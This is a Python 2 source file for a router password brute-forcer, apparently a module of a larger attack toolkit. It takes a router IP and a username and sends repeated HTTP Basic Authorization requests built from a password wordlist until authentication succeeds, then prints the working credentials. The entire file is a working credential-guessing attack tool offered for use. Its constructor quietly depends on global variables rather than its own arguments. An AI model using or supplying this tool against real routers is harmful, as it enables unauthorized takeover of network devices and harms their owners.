"""
router_brute.py - Router brute forcer

Author: Levi Nachamni (levi0x0)
Date: 20/05/2014
Version: 0.1
License: GPL 3

Description:
	Router brute forcer

"""
import urllib2
import sys
from base64 import b64encode
from time import sleep
from api.std import *

MODULE_NAME = "Router Brute"
MODULE_AUTHOR = "Levi Nachamni (levi0x0)"
MODULE_LICENSE = "GPL 3"
MODULE_VERSION = "0.1"
MODULE_DESC = "Router brute forcer"

class dsl_force(object):
	"""Router brute force Crack DSL Router Password"""

	def __init__(self, Target, Admin, lst):
		self.target = Target #target Router IP Address
		self.Admin = user  #username
		self.lst = passwords.replace("\n", "") #wordlist

	def run(self):
		self.request = urllib2.Request(self.target)
		self.toSend = "%s:%s" % (self.Admin, self.lst)
		self.en = b64encode(self.toSend)
		self.request.add_header("Authorization", "Basic %s" % self.en)
		
		try:
			self.lets = urllib2.urlopen(self.request)
			self.getCode = self.lets.getcode()
		except urllib2.HTTPError, e:
			return e.code
	
#unix
os_slash = "/"

def main():
	global user, passwords, target
	try:
		target = raw_input("Router IP (with http://):")
		if not "://" in target:
			error("http:// requierd..")
			return(1)
		user = raw_input("* User (admin):") or "admin"
		notify("Hit [ENTER] for the defualt Wordlist")
		passwords = raw_input("Wordlist (Default):") or "api/txt%spassword.lst" % (os_slash)
		passwords = open(passwords, "r").readlines()
		for passwords in passwords:
			start = dsl_force(target , user, passwords)
			code = start.run()
			if code == 401:
				print "[-]USER:%s PASS:%s ==>Faild!" % (user, passwords.replace("\n", ""))
			else:
				print "\n=> 401 error disappeared (:"
				print "[+]USER:%s" % (user)
				print "[+}Password:%s" % (passwords)
				break

	except KeyboardInterrupt as e:
		notify("Interrupt")
	except urllib2.URLError:
		error("Connection Faild!")
